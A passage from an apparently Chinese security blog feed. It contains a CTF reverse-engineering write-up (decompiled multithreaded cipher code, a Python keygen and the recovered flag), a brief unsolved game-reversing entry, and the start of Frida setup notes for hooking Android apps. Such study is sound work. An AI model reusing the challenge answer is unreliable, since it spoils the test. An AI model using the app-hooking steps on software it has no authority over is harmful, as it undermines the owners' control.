class="number">2</span>] = <span class="number">0LL</span>;</span><br><span class="line">        *v5 = v28;</span><br><span class="line">        _InterlockedAdd(v6, <span class="number">1u</span>);</span><br><span class="line">        <span class="keyword">if</span> ( *v32 )</span><br><span class="line">          syscall(<span class="number">202LL</span>, v6, <span class="number">1LL</span>, <span class="number">0x7FFFFFFF</span>LL);</span><br><span class="line">LABEL_26:</span><br><span class="line">        _InterlockedAdd(v32, <span class="number">1u</span>);</span><br><span class="line">LABEL_27:</span><br><span class="line">        v23 = *v6;</span><br><span class="line">        v24 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ( v12 == *v5 )</span><br><span class="line">        &#123;</span><br><span class="line">          v25 = v24 + <span class="number">1</span>;</span><br><span class="line">          <span class="keyword">if</span> ( v24 &lt;= <span class="number">0xB</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            _mm_pause();</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            sched_yield();</span><br><span class="line">            <span class="keyword">if</span> ( v25 == <span class="number">16</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">if</span> ( syscall(<span class="number">202LL</span>, v6, <span class="number">0LL</span>, v23, <span class="number">0LL</span>) )</span><br><span class="line">              &#123;</span><br><span class="line">                v26 = *__errno_location();</span><br><span class="line">                <span class="keyword">if</span> ( v26 != <span class="number">11</span> &amp;&amp; v26 != <span class="number">4</span> )</span><br><span class="line">                  <span class="built_in">std</span>::__throw_system_error(v26);</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">if</span> ( v12 == *v5 )</span><br><span class="line">                <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          v24 = v25;</span><br><span class="line">        &#125;</span><br><span class="line">        _InterlockedSub(v32, <span class="number">1u</span>);</span><br><span class="line">        v27 = v36-- == <span class="number">1</span>;</span><br><span class="line">        index = <span class="number">7</span> * index % <span class="number">0x11</span>;</span><br><span class="line">        piece = *data_to_encrypt;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( !v27 );</span><br><span class="line">      base += <span class="number">16LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( data_to_encrypt[<span class="number">1</span>] - piece &gt; base );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>实际上的加密逻辑非常短 大部分是在防止数据竞争 加密逻辑是通过一张表根据当前线程的ID对输入的16进制1字节数据进行二进制位替换 看起来是每次加密16字节的数据块 实际上每加密1个字节就会进入线程规划 所以当作每个字节单独加密 通过动态调试知道线程规划是当前线程加密完1字节的数据后启动线程<code>id</code>为<code>(当前id + 1) % 17</code>的线程 再看加密逻辑 当再次轮换到相同线程时将要加密的下一个字节的<code>index_new</code>定为<code>7 * index_now % 0x11</code> 而每个线程初始的<code>index</code>设为线程id 知道了这些就能写出keygen:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 先计算出加密的顺序 再逆序解密</span></span><br><span class="line"><span class="comment"># calculate_process.py:</span></span><br><span class="line">threads = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    thread = []</span><br><span class="line">    base = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        now = i + <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">            thread.append(now + base)</span><br><span class="line">            now = (<span class="number">7</span> * now) % <span class="number">0x11</span></span><br><span class="line">        base += <span class="number">16</span></span><br><span class="line">    threads.append(thread)</span><br><span class="line"><span class="built_in">print</span>(threads)</span><br><span class="line"><span class="comment"># keygen.py:</span></span><br><span class="line">enc = <span class="string">&quot;75ac713a945e9f78f657b735b7e1913cdece53b8853f3a7daade83b319c49139f8f655b0b77b&quot;</span></span><br><span class="line">enc = [<span class="built_in">int</span>(enc[<span class="number">2</span> * i:<span class="number">2</span> * i + <span class="number">2</span>], <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc) // <span class="number">2</span>)]</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">len</span>(enc) % <span class="number">0x10</span>):</span><br><span class="line">    enc.append(<span class="number">0</span>)</span><br><span class="line">enc.append(<span class="number">0</span>)</span><br><span class="line">indexs = [[<span class="number">1</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">17</span>, <span class="number">23</span>, <span class="number">31</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">27</span>, <span class="number">25</span>, <span class="number">28</span>, <span class="number">32</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">30</span>, <span class="number">29</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">21</span>, <span class="number">33</span>, <span class="number">39</span>, <span class="number">47</span>, <span class="number">35</span>, <span class="number">36</span>, <span class="number">43</span>, <span class="number">41</span>, <span class="number">44</span>, <span class="number">48</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">46</span>, <span class="number">45</span>, <span class="number">38</span>, <span class="number">40</span>, <span class="number">37</span>], [<span class="number">2</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">10</span>, <span class="number">18</span>, <span class="number">30</span>, <span class="number">29</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">21</span>, <span class="number">17</span>, <span class="number">23</span>, <span class="number">31</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">27</span>, <span class="number">25</span>, <span class="number">28</span>, <span class="number">32</span>, <span class="number">26</span>, <span class="number">34</span>, <span class="number">46</span>, <span class="number">45</span>, <span class="number">38</span>, <span class="number">40</span>, <span class="number">37</span>, <span class="number">33</span>, <span class="number">39</span>, <span class="number">47</span>, <span class="number">35</span>, <span class="number">36</span>, <span class="number">43</span>, <span class="number">41</span>, <span class="number">44</span>, <span class="number">48</span>, <span class="number">42</span>], [<span class="number">3</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">27</span>, <span class="number">25</span>, <span class="number">28</span>, <span class="number">32</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">30</span>, <span class="number">29</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">21</span>, <span class="number">17</span>, <span class="number">23</span>, <span class="number">31</span>, <span class="number">35</span>, <span class="number">36</span>, <span class="number">43</span>, <span class="number">41</span>, <span class="number">44</span>, <span class="number">48</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">46</span>, <span class="number">45</span>, <span class="number">38</span>, <span class="number">40</span>, <span class="number">37</span>, <span class="number">33</span>, <span class="number">39</span>, <span class="number">47</span>], [<span class="number">4</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">20</span>, <span class="number">27</span>, <span class="number">25</span>, <span class="number">28</span>, <span class="number">32</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">30</span>, <span class="number">29</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">21</span>, <span class="number">17</span>, <span class="number">23</span>, <span class="number">31</span>, <span class="number">19</span>, <span class="number">36</span>, <span class="number">43</span>, <span class="number">41</span>, <span class="number">44</span>, <span class="number">48</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">46</span>, <span class="number">45</span>, <span class="number">38</span>, <span class="number">40</span>, <span class="number">37</span>, <span class="number">33</span>, <span class="number">39</span>, <span class="number">47</span>, <span class="number">35</span>], [<span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">21</span>, <span class="number">17</span>, <span class="number">23</span>, <span class="number">31</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">27</span>, <span class="number">25</span>, <span class="number">28</span>, <span class="number">32</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">30</span>, <span class="number">29</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">37</span>, <span class="number">33</span>, <span class="number">39</span>, <span class="number">47</span>, <span class="number">35</span>, <span class="number">36</span>, <span class="number">43</span>, <span class="number">41</span>, <span class="number">44</span>, <span class="number">48</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">46</span>, <span class="number">45</span>, <span class="number">38</span>, <span class="number">40</span>], [<span class="number">6</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">21</span>, <span class="number">17</span>, <span class="number">23</span>, <span class="number">31</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">27</span>, <span class="number">25</span>, <span class="number">28</span>, <span class="number">32</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">30</span>, <span class="number">29</span>, <span class="number">38</span>, <span class="number">40</span>, <span class="number">37</span>, <span class="number">33</span>, <span class="number">39</span>, <span class="number">47</span>, <span class="number">35</span>, <span class="number">36</span>, <span class="number">43</span>, <span class="number">41</span>, <span class="number">44</span>, <span class="number">48</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">46</span>, <span class="number">45</span>], [<span class="number">7</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">23</span>, <span class="number">31</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">27</span>, <span class="number">25</span>, <span class="number">28</span>, <span class="number">32</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">30</span>, <span class="number">29</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">21</span>, <span class="number">17</span>, <span class="number">39</span>, <span class="number">47</span>, <span class="number">35</span>, <span class="number">36</span>, <span class="number">43</span>, <span class="number">41</span>, <span class="number">44</span>, <span class="number">48</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">46</span>, <span class="number">45</span>, <span class="number">38</span>, <span class="number">40</span>, <span class="number">37</span>, <span class="number">33</span>], [<span class="number">8</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">24</span>, <span class="number">21</span>, <span class="number">17</span>, <span class="number">23</span>, <span class="number">31</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">27</span>, <span class="number">25</span>, <span class="number">28</span>, <span class="number">32</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">30</span>, <span class="number">29</span>, <span class="number">22</span>, <span class="number">40</span>, <span class="number">37</span>, <span class="number">33</span>, <span class="number">39</span>, <span class="number">47</span>, <span class="number">35</span>, <span class="number">36</span>, <span class="number">43</span>, <span class="number">41</span>, <span class="number">44</span>, <span class="number">48</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">46</span>, <span class="number">45</span>, <span class="number">38</span>], [<span class="number">9</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">25</span>, <span class="number">28</span>, <span class="number">32</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">30</span>, <span class="number">29</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">21</span>, <span class="number">17</span>, <span class="number">23</span>, <span class="number">31</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">27</span>, <span class="number">41</span>, <span class="number">44</span>, <span class="number">48</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">46</span>, <span class="number">45</span>, <span class="number">38</span>, <span class="number">40</span>, <span class="number">37</span>, <span class="number">33</span>, <span class="number">39</span>, <span class="number">47</span>, <span class="number">35</span>, <span class="number">36</span>, <span class="number">43</span>], [<span class="number">10</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">30</span>, <span class="number">29</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">21</span>, <span class="number">17</span>, <span class="number">23</span>, <span class="number">31</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">27</span>, <span class="number">25</span>, <span class="number">28</span>, <span class="number">32</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">46</span>, <span class="number">45</span>, <span class="number">38</span>, <span class="number">40</span>, <span class="number">37</span>, <span class="number">33</span>, <span class="number">39</span>, <span class="number">47</span>, <span class="number">35</span>, <span class="number">36</span>, <span class="number">43</span>, <span class="number">41</span>, <span class="number">44</span>, <span class="number">48</span>], [<span class="number">11</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">27</span>, <span class="number">25</span>, <span class="number">28</span>, <span class="number">32</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">30</span>, <span class="number">29</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">21</span>, <span class="number">17</span>, <span class="number">23</span>, <span class="number">31</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">43</span>, <span class="number">41</span>, <span class="number">44</span>, <span class="number">48</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">46</span>, <span class="number">45</span>, <span class="number">38</span>, <span class="number">40</span>, <span class="number">37</span>, <span class="number">33</span>, <span class="number">39</span>, <span class="number">47</span>, <span class="number">35</span>, <span class="number">36</span>], [<span class="number">12</span>, <span class="number">16</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">28</span>, <span class="number">32</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">30</span>, <span class="number">29</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">21</span>, <span class="number">17</span>, <span class="number">23</span>, <span class="number">31</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">27</span>, <span class="number">25</span>, <span class="number">44</span>, <span class="number">48</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">46</span>, <span class="number">45</span>, <span class="number">38</span>, <span class="number">40</span>, <span class="number">37</span>, <span class="number">33</span>, <span class="number">39</span>, <span class="number">47</span>, <span class="number">35</span>, <span class="number">36</span>, <span class="number">43</span>, <span class="number">41</span>], [<span class="number">13</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">29</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">21</span>, <span class="number">17</span>, <span class="number">23</span>, <span class="number">31</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">27</span>, <span class="number">25</span>, <span class="number">28</span>, <span class="number">32</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">30</span>, <span class="number">45</span>, <span class="number">38</span>, <span class="number">40</span>, <span class="number">37</span>, <span class="number">33</span>, <span class="number">39</span>, <span class="number">47</span>, <span class="number">35</span>, <span class="number">36</span>, <span class="number">43</span>, <span class="number">41</span>, <span class="number">44</span>, <span class="number">48</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">46</span>], [<span class="number">14</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">30</span>, <span class="number">29</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">21</span>, <span class="number">17</span>, <span class="number">23</span>, <span class="number">31</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">27</span>, <span class="number">25</span>, <span class="number">28</span>, <span class="number">32</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">46</span>, <span class="number">45</span>, <span class="number">38</span>, <span class="number">40</span>, <span class="number">37</span>, <span class="number">33</span>, <span class="number">39</span>, <span class="number">47</span>, <span class="number">35</span>, <span class="number">36</span>, <span class="number">43</span>, <span class="number">41</span>, <span class="number">44</span>, <span class="number">48</span>, <span class="number">42</span>, <span class="number">34</span>], [<span class="number">15</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">31</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">27</span>, <span class="number">25</span>, <span class="number">28</span>, <span class="number">32</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">30</span>, <span class="number">29</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">21</span>, <span class="number">17</span>, <span class="number">23</span>, <span class="number">47</span>, <span class="number">35</span>, <span class="number">36</span>, <span class="number">43</span>, <span class="number">41</span>, <span class="number">44</span>, <span class="number">48</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">46</span>, <span class="number">45</span>, <span class="number">38</span>, <span class="number">40</span>, <span class="number">37</span>, <span class="number">33</span>, <span class="number">39</span>], [<span class="number">16</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">32</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">30</span>, <span class="number">29</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">21</span>, <span class="number">17</span>, <span class="number">23</span>, <span class="number">31</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">27</span>, <span class="number">25</span>, <span class="number">28</span>, <span class="number">48</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">46</span>, <span class="number">45</span>, <span class="number">38</span>, <span class="number">40</span>, <span class="number">37</span>, <span class="number">33</span>, <span class="number">39</span>, <span class="number">47</span>, <span class="number">35</span>, <span class="number">36</span>, <span class="number">43</span>, <span class="number">41</span>, <span class="number">44</span>]]</span><br><span class="line">key = [</span><br><span class="line">  <span class="number">0x02</span>, <span class="number">0x08</span>, <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x05</span>, <span class="number">0x04</span>, <span class="number">0x07</span>, <span class="number">0x06</span>, <span class="number">0x01</span>, </span><br><span class="line">  <span class="number">0x04</span>, <span class="number">0x08</span>, <span class="number">0x05</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x07</span>, <span class="number">0x07</span>, <span class="number">0x08</span>, <span class="number">0x03</span>, <span class="number">0x05</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x04</span>, <span class="number">0x06</span>, <span class="number">0x04</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x06</span>, <span class="number">0x02</span>, <span class="number">0x08</span>, </span><br><span class="line">  <span class="number">0x05</span>, <span class="number">0x07</span>, <span class="number">0x07</span>, <span class="number">0x05</span>, <span class="number">0x08</span>, <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x03</span>, <span class="number">0x02</span>, </span><br><span class="line">  <span class="number">0x07</span>, <span class="number">0x04</span>, <span class="number">0x08</span>, <span class="number">0x05</span>, <span class="number">0x06</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0x07</span>, <span class="number">0x06</span>, </span><br><span class="line">  <span class="number">0x04</span>, <span class="number">0x08</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x02</span>, <span class="number">0x05</span>, <span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0x08</span>, <span class="number">0x04</span>, </span><br><span class="line">  <span class="number">0x07</span>, <span class="number">0x02</span>, <span class="number">0x06</span>, <span class="number">0x05</span>, <span class="number">0x03</span>, <span class="number">0x04</span>, <span class="number">0x08</span>, <span class="number">0x06</span>, <span class="number">0x02</span>, <span class="number">0x05</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x07</span>, <span class="number">0x08</span>, <span class="number">0x01</span>, <span class="number">0x06</span>, <span class="number">0x02</span>, <span class="number">0x07</span>, <span class="number">0x05</span>, <span class="number">0x04</span>, <span class="number">0x03</span>, </span><br><span class="line">  <span class="number">0x02</span>, <span class="number">0x07</span>, <span class="number">0x05</span>, <span class="number">0x08</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x03</span>, <span class="number">0x06</span>, <span class="number">0x03</span>, <span class="number">0x04</span>, </span><br><span class="line">  <span class="number">0x02</span>, <span class="number">0x06</span>, <span class="number">0x05</span>, <span class="number">0x08</span>, <span class="number">0x07</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x03</span>, <span class="number">0x05</span>, </span><br><span class="line">  <span class="number">0x07</span>, <span class="number">0x06</span>, <span class="number">0x02</span>, <span class="number">0x08</span>, <span class="number">0x04</span>, <span class="number">0x07</span>, <span class="number">0x03</span>, <span class="number">0x06</span>, <span class="number">0x05</span>, <span class="number">0x01</span>, </span><br><span class="line">  <span class="number">0x08</span>, <span class="number">0x02</span>, <span class="number">0x06</span>, <span class="number">0x07</span>, <span class="number">0x04</span>, <span class="number">0x01</span>, <span class="number">0x05</span>, <span class="number">0x03</span>, <span class="number">0x02</span>, <span class="number">0x08</span>, </span><br><span class="line">  <span class="number">0x03</span>, <span class="number">0x08</span>, <span class="number">0x04</span>, <span class="number">0x06</span>, <span class="number">0x07</span>, <span class="number">0x02</span>, <span class="number">0x05</span>, <span class="number">0x01</span></span><br><span class="line">]</span><br><span class="line">key = [key[i] - <span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(key))]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x2F</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">id</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        now = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            <span class="keyword">if</span> enc[indexs[<span class="built_in">id</span>][i]] &amp; (<span class="number">1</span> &lt;&lt; key[<span class="number">8</span> * <span class="built_in">id</span> + j]):</span><br><span class="line">                now |= <span class="number">1</span> &lt;&lt; j</span><br><span class="line">        enc[indexs[<span class="built_in">id</span>][i]] = now</span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> enc:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(s), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="comment"># utflag&#123;i_got_the_need_for_amdahls_law&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="In-The-Dark-unsolved-混淆-游戏逆向"><a href="#In-The-Dark-unsolved-混淆-游戏逆向" class="headerlink" title="In The Dark(unsolved) | 混淆 | 游戏逆向"></a>In The Dark(unsolved) | 混淆 | 游戏逆向</h2><p>题目给出了一个没有图形化界面的游戏 可以输入wasd进行操作 但是由于代码进行了混淆所以几乎不可能通过静态分析得到游戏逻辑 听大佬说可以用ALF++通杀游戏逆向 以后研究一下</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>REV</category>
        <category>WPs</category>
      </categories>
      <tags>
        <tag>逆向</tag>
        <tag>多线程</tag>
      </tags>
  </entry>
  <entry>
    <title>Frida学习记录</title>
    <url>/2024/05/10/Frida%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>记录一下学习Frida的历程</p>
<span id="more"></span>

<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>雷电模拟器(版本9.0.70.0)的安卓版本为Android9 处理器框架为x86_x64 建议使用</p>
<p><a href="https://github.com/frida/frida/releases/download/14.2.18/frida-server-14.2.18-android-x86_64.xz">Frida Server14.2.18</a> + Python3.8 + Frida14.2.18(pip install frida&#x3D;&#x3D;14.2.18, frida-tools&#x3D;&#x3D;9.2.5)的环境配置</p>
<p>下载完服务器后使用<code>adb</code>将其移入模拟器中:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb -s emulator-5554 push fs \data\local\tmp</span><br><span class="line">adb -s emulator-5554 shell &quot;chmod 777 \data\local\tmp\fs&quot;</span><br></pre></td></tr></table></figure>

<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p>在模拟器上安装<code>frida-server</code>后用<code>adb</code>命令<code>adb -s deviceID shell &quot;/data/local/tmp/fs&amp;&quot;</code>启用服务器 此时再打开一个终端进行端口转发:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb forward tcp:27042 tcp:27042</span><br><span class="line">adb forward tcp:27043 tcp:27043</span><br></pre></td></tr></table></figure>

<p>现在可以使用<code>frida-ps -U</code>显示进程和包名 假设已经写好hook脚本<code>hook.js</code> 并且要hook的程序正在运行 可以使用<code>frida -U -f 包名 -l hook.js</code>将脚本注入程序中</p>
<h2 id="hook脚本编写"><a href="#hook脚本编写" class="headerlink" title="hook脚本编写"></a>hook脚本编写</h2><h3 id="hook结果和参数-修改结果"><a href="#hook结果和参数-修改结果" class="headerlink" title="hook结果和参数 修改结果"></a>hook结果和参数 修改结果</h3><p>以以下的包为例子:</p>
